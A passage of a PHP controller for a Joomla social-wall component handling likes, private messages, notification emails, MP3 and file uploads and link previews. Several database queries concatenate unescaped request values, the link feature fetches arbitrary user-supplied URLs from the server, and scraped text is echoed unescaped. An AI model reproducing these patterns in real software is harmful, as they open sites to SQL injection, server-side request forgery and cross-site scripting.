	<a href="javascript:void(0);" onclick="openLikeCommentBox('<?php echo JURI::base().'index.php?option=com_awdwall&view=awdwall&task=addlikemsg&wid=' . $wid  . '&cid=' .(int)$user->id.'&tmpl=component';?>', '<?php echo JURI::base().'index.php?option=com_awdwall&view=awdwall&task=getclikemsg&wid=' . (int)$wid . '&tmpl=component&Itemid='.$Itemid;?>', '<?php echo (int)$wid;?>');"> <?php echo JText::_('Like');?></a> &nbsp;&nbsp;<span class="likespan"><?php echo $totallike;?></span>
        <?php
		}
		}
		else
		{
        ?>
	&nbsp;&nbsp;<a href="javascript:void(0);" onclick="openLikeCommentBox('<?php echo JURI::base().'index.php?option=com_awdwall&view=awdwall&task=addlikemsg&wid=' . $wid  . '&cid=' .(int)$user->id.'&tmpl=component';?>', '<?php echo JURI::base().'index.php?option=com_awdwall&view=awdwall&task=getclikemsg&wid=' . (int)$wid . '&tmpl=component&Itemid='.$Itemid;?>', '<?php echo (int)$wid;?>');"> <?php echo JText::_('Like');?></a>
        <?php
		}
		exit;
	}
	function getLikeMsg()
	{	
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('like_msg');
		$view->getLikeMsg();
		exit;
	}
	
	function getPMBox()
	{
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('pm_box');
		$view->getPMBox();
		exit;
	}
	
	function addPM()
	{
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$mainframe	=& JFactory::getApplication();
		$Itemid = AwdwallHelperUser::getComItemId();
		$cid 		= JRequest::getInt('cid', 0);
		$msg 		= JRequest::getString('awd_pm_' . $cid);
		$receiverId = JRequest::getInt('pm_receiver_id_' . $cid, 0);
		$wallId 	= JRequest::getInt('pm_wall_id_' . $cid, 0);
		$user 		= &JFactory::getUser();		
		$db 		= &JFactory::getDBO();
		if((int)$user->id){
			$wall 				=& JTable::getInstance('Wall', 'Table');						
			$wall->user_id		= $receiverId;
			$wall->type			= 'text';
			$wall->commenter_id	= $user->id;
			$wall->user_name	= '';
			$wall->avatar		= '';
			$wall->message		= $msg;
			$wall->reply		= 0;
			$wall->is_read		= 0;
			$wall->is_pm		= 1;
			$wall->is_reply		= 0;
			$wall->posted_id	= NULL;
			$wall->wall_date	= time();
			// store wall to database
			if (!$wall->store()){				
				$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$Itemid , false ), JText::_('Post Failed'));
			}
			// set wall id to view
			JRequest::setVar('wid', $wall->id);
			//insert into awd_wall_notification table.
			
			$ndate=date("Y-m-d H:i:s");
			$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "' . $receiverId . '", "' . $user->id . '", "pm", "' . $wall->id . '", ""," ", "","0")';
			$db->setQuery($query);
			$db->query();
			// send email if is enabled
			//$config = &JComponentHelper::getParams('com_awdwall');
			$app = JFactory::getApplication('site');
			$config =  & $app->getParams('com_awdwall');
			$displayName 	= $config->get('display_name', 1);
			if($config->get('email_auto', 0) && ($receiverId != $user->id)){
			
			$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$receiverId.'&Itemid='.$itemId.'#here'.$wall->id,false) ;
				$receiver = &JFactory::getUser($receiverId);
				$rName =  AwdwallHelperUser::getDisplayName($receiverId);
				$sName =  AwdwallHelperUser::getDisplayName($user->id);	
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_PM_BODY',$sName);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$user->id.'&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$rName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-right:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td ><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px 0px;">'.$emailtext1.'</td></tr></tbody></table></td></tr></tbody></table></td><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-width:1px;border-style:solid;border-color:#E3C823;background-color:#FFF9D9"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px;border-top:1px solid #fff"><a target="_blank" style="color:#6176b7;text-decoration:none" href="'.$walllink.'"><span style="font-weight:bold;white-space:nowrap;color:#3b5b98;font-size:11px">'.$emailtext2.'</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';			
			
			

				$body = $emailcontent;
				$mailer = & JFactory::getMailer();
				$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
				$mailer->setSubject(JText::_($mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_SUBJECT_NEW_PM', $sName)));
				$mailer->setBody($body);
				$mailer->IsHTML(1);
				$mailer->addRecipient($receiver->email);
				$rs = $mailer->Send();		
			}
			// prepend html to main wall		
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('pm_block');
			$view->getPMBlock();
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$Itemid, false), JText::_('Need to login'));
		}
		exit;
	}
	
	function getLatestPost()
	{
		$wuid 		= JRequest::getInt('wuid', 0);
		$user 		= &JFactory::getUser();
		if($wuid == (int)$user->id){
			$wallModel 	= $this->getModel('wall');
			$row 		= $wallModel->getLatestPostByUserId($user->id);
			if(isset($row->message))
				echo AwdwallHelperUser::showSmileyicons($row->message);
		}
		exit;
	}
	
	//dangcv get status groups
	function getLatestPostgroup()
	{
		$groupid 		= JRequest::getInt('groupid', 0);
		$user 			= &JFactory::getUser();
		if($groupid){
			$wallModel 	= $this->getModel('wall');
			$row 		= $wallModel->statusgroup($groupid, $user->id);
			if(isset($row->message))
				echo AwdwallHelperUser::showSmileyicons($row->message);
		}
		exit;
	}
	
	function getOlderPosts()
	{
		$user 	= &JFactory::getUser();
		$wuid 	= JRequest::getInt('wuid', 0);
		$layout = JRequest::getCmd('layout', '');
		if($layout != '' && $layout == 'mywall' && $user->id){
			if($wuid == 0)
				JRequest::setVar('wuid', $user->id);
		}
		$wallModel 	= $this->getModel('wall');
		$view  		= &$this->getView('awdwall', 'html');
		$view->setLayout('older_posts_block');
		$view->setModel($wallModel);
		$view->getOlderPosts();
		exit;
	}
	
	function getOlderComments()
	{
		$user 	= &JFactory::getUser();
		$wuid 	= JRequest::getInt('wuid', 0);
		$layout = JRequest::getCmd('layout', '');
		if($layout != '' && $layout == 'mywall' && $user->id){
			if($wuid == 0)
				JRequest::setVar('wuid', $user->id);
		}
		$wallModel 	= $this->getModel('wall');
		$view  		= &$this->getView('awdwall', 'html');
		$view->setLayout('older_comments_block');
		$view->setModel($wallModel);
		$view->getOlderComments();
		exit;
	}
	
	function getWhoLikesLink()
	{
		$wid = JRequest::getInt('wid', 0);
		echo '- <a href="javascript:void(0);" onclick="getWhoLikeMsg(' . "'" . 'index.php?option=com_awdwall&view=awdwall&task=getlikemsg&wid=' . (int)$wid . '&tmpl=component' . "'" . ',' . $wid . ');">Who likes it</a>';
		exit;
	}
	
	function addMp3()
	{
	
		$user = &JFactory::getUser();
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		$groupId = JRequest::getInt('groupid', NULL);
		$itemId = AwdwallHelperUser::getComItemId();
		$db =& JFactory::getDBO();
		if((int)$user->id){
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
			$arrExt 	= explode(',', 'mp3');
			$file 		= JRequest::getVar('awd_link_mp3', null, 'files', 'array');
			//$file 		=$_REQUEST['awd_link_mp3'];
/*					echo '<script type="text/javascript"> alert("'.$image['tmp_name'].'");</script>';
exit;
*/			$fileTitle 	= JRequest::getVar('awd_mp3_title', '');					
			$fileDesc 	= JRequest::getVar('awd_mp3_desc', '');
			
			if($file['name'] != ''){			
	
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($file['name']);
				$fileName = str_replace(' ', '_', $fileName);
				
		
				$src 	= $file['tmp_name'];
				if(!JFolder::exists('images' . DS . 'mp3' . DS . $wuid)){
					JFolder::create('images' . DS . 'mp3' . DS . $wuid);
					JFile::copy('images' . DS . 'index.html', 'images' . DS . 'mp3' . DS . $wuid . DS . 'index.html');
				}
				$dest 	= 'images' . DS . 'mp3' . DS . $wuid . DS . $fileName; 
				
				//$dest 	= JURI::base().'images/mp3/' . $wuid .'/'. $fileName; 
				
				//$file_extension=awdwallController::get_file_extension($fileName);
				
			if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
					if (JFile::upload($src, $dest)){ 
					
					//if ($file_extension=='mp3'){
					JFile::upload($src, $dest);
					
					// save into wall table first
					
					$wall = &JTable::getInstance('Wall', 'Table');
					$wall->user_id 		= $wuid;					
					$wall->type			= 'mp3';
						
					$wall->commenter_id	= $user->id;
					$wall->user_name	= '';
					$wall->avatar		= '';
					$wall->message		= '';
					$wall->reply		= 0;
					$wall->is_read		= 0;
					$wall->is_pm		= 0;
					$wall->is_reply		= 0;
					$wall->posted_id	= NULL;
					$wall->wall_date	= NULL;
				
					// store wall to database
					if (!$wall->store()){				
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));	
					}
					$wallId = $wall->id;
					
					$sql = 'INSERT INTO #__awd_wall_mp3s(wall_id, title, path, description) VALUES("'.$wallId.'","'.$fileTitle.'"' . ', "' . $fileName . '","' . $fileDesc . '")';
					$db->setQuery($sql);
					$db->query();
									
					//}
					}
					else {						
						//Redirect and throw an error message
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
					}
				}
				else {
					//Redirect and notify user file is not right extension
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
				}
			}
		
			$error = '';
			$msg  = "File Name: hello";
			
			echo "{";
			echo "error: '" . $error . "',\n";
			echo "msg: '" . $msg .  "',\n";
			echo "file: '<a href='" . JURI::base() . 'images/mp3/' . $wall->user_id .'/' . $fileName . "' target='_blank'>" . $fileName .  "</a>',\n";
			echo "wid_tmp: '" . $wallId .  "'\n";
			echo "}";
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&layout=mywall&view=awdwall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		}
		$this->setRedirect(JRoute::_('index.php?option=com_awdwall&layout=mywall&view=awdwall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
				
		
		exit;
	}
	
	function fetch_record($path)
	{
		$file = fopen($path, "r"); 
		if (!$file)
		{
			exit("Problem occured");
		} 
		$data = '';
		while (!feof($file))
		{
			$data .= fgets($file, 1024);
		}
		return $data;
	}
	
	function read_file($pathfile){	
		@ $fp=fopen($pathfile,"r");
		$str = '';
		while(!feof($fp)){
			$s = fgetc($fp);
			$str = $str.$s;
		}	
		fclose($fp);
		return $str;
	}
	function write_file($pathfile, $str){	
		@ $fp=fopen($pathfile,"w");  	
		fwrite($fp,$str);	
		fclose($fp);	
	}
	function ajaxstatuslink(){
		
		$user = &JFactory::getUser();		
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		
		$text = JRequest::getvar('txt');
		$reg_exUrl = "/(http|https|ftp|ftps)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(\/\S*)?/";
		if(preg_match($reg_exUrl, $text, $url)){
			echo '{"url": "'.$url[0].'","wuid": "'.$wuid.'"}';
		} else {
			echo '{"url": ""}';
		}
		exit;
	}
	function addLink()
	{
		$user = &JFactory::getUser();		
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		$groupId = JRequest::getInt('groupid', NULL);
		$itemId = AwdwallHelperUser::getComItemId();
		$db =& JFactory::getDBO();
		if((int)$user->id){
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');					
			$link 	= JRequest::getVar('awd_link', '');		
			//echo 	$link;
			if($link != ''){
			
				//$vLink = 'http://'.JString::str_ireplace( 'http://' , '' , $link );		
				$parsedVideoLink	= parse_url($link);
				preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $parsedVideoLink['host'], $matches);
				$domain		= $matches['domain'];
				
				if($domain=='youtu.be')
				{
				$vidoid=str_replace('http://youtu.be/','',$link);
				if($vidoid)
				$link = 'http://www.youtube.com/watch?v='.$vidoid;
				}
							
							
				// add video
				require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'linkvideo.php');				
				$check_link = linkvideo::typelink($link);				
				$typelink 	= array('howcast', 'metacafe', 'myspace', 'vimeo', 'youtube','blip','break','dailymotion','flickr','justin','liveleak','livestream','mips','mtv','photobucket','twitch','ustream');
				if(in_array($check_link, $typelink)){
					$video = linkvideo::getidvideo($check_link, $link);
					if($video->videoId){
						linkvideo::addlinkvideo($link);
						exit;
					}
				}
				
				// get title and description tag							
				require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'remote.php');
				$title = '';
				$description = '';
				$fileName = '';
				$link = JRequest::getString('awd_link', $link);
//				if(!stripos($link, "www")){
//
//					$link = str_replace("http://", "http://www.", $link);
//
//				}
				$content = getContentFromUrl($link);
				// get title
//				$file = fopen($link, "r"); 
//				if (!$file)
//				{
//					exit("Problem occured");
//				} 
//				$data = '';
//				while (!feof($file))
//				{
//					$data .= fgets($file, 1024);
//				}
				// get title
				$pattern =  "'<title>(.*?)<\/title>'s";		
				preg_match_all($pattern, $content, $matches);
				//if($matches){
					$title = $matches[1][0];
				//}
				$tags = get_meta_tags($link);
				$description = $tags['description'];
                if(empty($description)){
				$pattern =  "/<meta name=\"description\"  content=\"(.*)\" \/>/i";
				preg_match_all($pattern, $content, $matches);
				
				if( $matches && !empty($matches[1][0]) )
				{
					$description = trim(strip_tags($matches[1][0],'<br /><br>'));
				}

                }
				// get body content
				$pattern =  "'<body(.*)>(.*?)<\/body>'s";
				preg_match_all($pattern, $content, $matches);
				if($matches){
					$body = $matches[0][0];
					$pattern =  "/<img[^>]+>/i";		
					preg_match_all($pattern, $body, $matches);
					if($matches){
						$image = $matches[0][0];
						preg_match_all('/(alt|title|src)=("[^"]*")/i', $image, $img);
						$src = str_replace('"', '', $img[2][0]);				
						$imageContent = file_get_contents($src);				
					}
				}
				// save into wall table first
				$wall = &JTable::getInstance('Wall', 'Table');
				$wall->user_id 		= $wuid;					
				$wall->type			= 'link';
				$wall->commenter_id	= $user->id;
				$wall->user_name	= '';
				$wall->avatar		= '';
				$wall->message		= '';
				$wall->reply		= 0;
				$wall->is_read		= 0;
				$wall->is_pm		= 0;
				$wall->is_reply		= 0;
				$wall->posted_id	= NULL;
				$wall->wall_date	= NULL;
				$title 			= ltrim($title);
				$title 			= rtrim($title);
				$description 	= ltrim($description);
				$description 	= rtrim($description);
				// store wall to database
				if (!$wall->store()){				
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));	
				}
				$wallId = $wall->id;				
				$sql = 'INSERT INTO #__awd_wall_links(wall_id, title, link, path, description) VALUES("'.$wallId .'","' . $title . '", "' . $link . '", "' . $fileName . '","' . $description . '")';
				$db->setQuery($sql);
				$db->query();
			}
			$string = getContentFromUrl($link);
			$image_regex = '/<img[^>]*'.'src=[\"|\'](.*)[\"|\']/Ui';
			preg_match_all($image_regex, $string, $img, PREG_PATTERN_ORDER);
			$images_array = $img[1];
			$error = '';
			$msg  = "File Name: hello";
			//$link_new = '<a href=' . $link . ' target=_blank>' . $link .  '</a>';
			//$title_new = '<span class=editable>' . $title .  '</span>';
			//$temp = $link_new.$title_new;
			$file = $description;
			//images				
			//$d = strrpos($link, '/');
			//$first_link = substr($link, 0, $d);
			preg_match('/http:\/\/(.*).(.*)\//', $link, $link_root);
			$first_link = $link_root[0];
			$d = 0;
			$n = count($images_array);
			if ($n>0){		
				for($k=0; $k<$n;$k++){					
					$check = strrpos($images_array[$k], 'http');
					if((string)$check == ""){			
						$images_array[$k] = $first_link . $images_array[$k];
					}
					if(@GetImageSize($images_array[$k])){
					list($width, $height) = getimagesize($images_array[$k]);			
					if($width >= 50) {
						$d = $d + 1;
						if($d == 1){
							$link_img1 = $images_array[$k];
							$query = "UPDATE #__awd_wall_links SET link_img = '$link_img1' WHERE wall_id = '$wallId'";
							$db->setQuery($query);
							$db->query();
							$img = '<img id='.$d.' class=no_hidden src='.$images_array[$k].'>'.$img;
						}else{
							$img = '<img id='.$d.' class=hidden src='.$images_array[$k].'>'.$img;
						}						
					}
				}
			}
			}else{
				echo 'no image';
			}
			//$img = $img.'<input type=hidden id=count_img value='.$n.' />';
			echo '{"type": "link","foo": "'.$file.'","img": "'.$img.'","count_img": "'.$d.'","error": "' . $error . '","msg": "' . $msg .  '","file": "<a href=' . $link . ' target=_blank>' . $link .  '</a>","wid_tmp": "' . $wallId .  '","title": "' . $title .  '"}';
			//echo '{"foo": "'.$file.'","img": "'.$img.'","error": "' . $error . '","msg": "' . $msg .  '","file": "<a href=' . $link . ' target=_blank>' . $link .  '</a>","wid_tmp": "' . $wallId .  '","title": "<span class=editable>' . $title .  '</span>"}';
			/* echo "{";
			echo '"error": "' . $error . '",';
			echo '"msg": "' . $msg .  '",';			
			echo '"file": "<a href=' . $link . ' target=_blank>' . $link .  '</a>",';			
			echo '"wid_tmp": "' . $wallId .  '"';
			echo "}"; */			
			/* echo 'img:';
			$n = count($images_array);
			for ($i=0;$i<=$n;$i++)
			{
				if($images_array[$i])
				{
					if(getimagesize($images_array[$i]))
					{
						list($width, $height, $type, $attr) = getimagesize(@$images_array[$i]);
						if($width >= 50 && $height >= 50 ){
							echo "<img src='".@$images_array[$i]."' width='100' id='".$k."' >";
							$k++;
						}
					}
				}
			} */
		}
		exit;
	}
	
	function addFile()
	{
		$user = &JFactory::getUser();
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		$groupId = JRequest::getInt('groupid', NULL);
		$itemId = AwdwallHelperUser::getComItemId();
		$db =& JFactory::getDBO();
		if((int)$user->id){
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');		
			$arrExt 	= explode(',', AwdwallHelperUser::getFileExt());		
			$file 		= JRequest::getVar('awd_file_link', null, 'files', 'array');
			$fileTitle 	= JRequest::getVar('awd_file_title', '');					
			$fileDesc 	= JRequest::getVar('awd_file_desc', '');
						
			if($file['name'] != ''){			
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($file['name']);
				$fileName = str_replace(' ', '_', $fileName);
				$src 	= $file['tmp_name'];
				if(!JFolder::exists('images' . DS . 'awdfiles' . DS . $wuid)){
					JFolder::create('images' . DS . 'awdfiles' . DS . $wuid);
					JFile::copy('images' . DS . 'index.html', 'images' . DS . 'awdfiles' . DS . $wuid . DS . 'index.html');
				}
				$dest 	= 'images' . DS . 'awdfiles' . DS . $wuid . DS . $fileName; 
				if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
					if (JFile::upload($src, $dest)){ 
												
					// save into wall table first
					$wall = &JTable::getInstance('Wall', 'Table');
					$wall->user_id 		= $wuid;					
					$wall->type			= 'file';
					$wall->commenter_id	= $user->id;
					$wall->user_name	= '';
					$wall->avatar		= '';
					$wall->message		= '';
					$wall->reply		= 0;
					$wall->is_read		= 0;
					$wall->is_pm		= 0;
					$wall->is_reply		= 0;
					$wall->posted_id	= NULL;
					$wall->wall_date	= NULL;
				
					// store wall to database
					if (!$wall->store()){				
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));	
					}
					$wallId = $wall->id;
					
					$sql = 'INSERT INTO #__awd_wall_files(wall_id, title, path, description) VALUES("'.$wallId.'","'.$fileTitle.'"' . ', "' . $fileName . '","' . $fileDesc . '")';
					$db->setQuery($sql);
					$db->query();
						
					}else {						
						//Redirect and throw an error message
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
					}
				}else {
				echo '<script >parent.document.getElementById("file_loading").style.display = \'none\';parent.document.getElementById("awd_file_link").className=\'invalid\';</script>';
				//echo '<script >alert("Invaild file extension");<script>';
				exit;
					//Redirect and notify user file is not right extension
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
				}
			}
			$error = '';
			$msg  = "File Name: hello";
			
			echo "{";
			echo "error: '" . $error . "',\n";
			echo "msg: '" . $msg .  "',\n";
			echo "file: '<a href='" . JURI::base() . 'images/awdfiles/' . $wall->user_id .'/' . $fileName . "' target='_blank'>" . $fileName .  "</a>',\n";
			echo "wid_tmp: '" . $wallId .  "'\n";
			echo "}";
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&layout=mywall&view=awdwall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		}
		$this->setRedirect(JRoute::_('index.php?option=com_awdwall&layout=mywall&view=awdwall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
				
		
		exit;
	}
	
	function getLatestMsg()
	{
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$wallModel = $this->getModel('wall');
		// prepend html to main wall		
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('older_posts_block');
		$view->setModel($wallModel);
		$view->getLatestMsgBlock();
		exit;
	}
	
	function addPMUser()
	{
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$wallModel = $this->getModel('wall');
		$mainframe	=& JFactory::getApplication();
		$itemId = AwdwallHelperUser::getComItemId();			
		$msg 		= JRequest::getString('awd_pm_description');
		$receiverId = JRequest::getInt('awd_pm_receiver_id', 0);		
		$user 		= &JFactory::getUser();		
		$db 		= &JFactory::getDBO();
		if((int)$user->id){
			$wall 				=& JTable::getInstance('Wall', 'Table');						
			$wall->user_id		= $receiverId;
			$wall->type			= 'text';
			$wall->commenter_id	= $user->id;
			$wall->user_name	= '';
			$wall->avatar		= '';
			$wall->message		= $msg;
			$wall->reply		= 0;
			$wall->is_read		= 0;
			$wall->is_pm		= 1;
			$wall->is_reply		= 0;
			$wall->posted_id	= NULL;
			$wall->wall_date	= time();
			// store wall to database
			if (!$wall->store()){				
				$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
			}
			//insert into awd_wall_notification table.
			
			$ndate=date("Y-m-d H:i:s");
			$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "' . $receiverId . '", "' . $user->id . '", "pm", "' . $wall->id . '", ""," ", "","0")';
			$db->setQuery($query);
			$db->query();
			// set wall id to view
			JRequest::setVar('wid', $wall->id);
			// send email if is enabled
			//$config = &JComponentHelper::getParams('com_awdwall');
			$app = JFactory::getApplication('site');
			$config =  & $app->getParams('com_awdwall');
			$displayName 	= $config->get('display_name', 1);
			if($config->get('email_auto', 0) && ($receiverId != $user->id)){
			$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$receiverId.'&Itemid='.$itemId.'#here'.$wall->id,false) ;
				$receiver = &JFactory::getUser($receiverId);
				$rName =  AwdwallHelperUser::getDisplayName($receiverId);
				$sName =  AwdwallHelperUser::getDisplayName($user->id);	
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_PM_BODY',$sName);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$user->id.'&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" 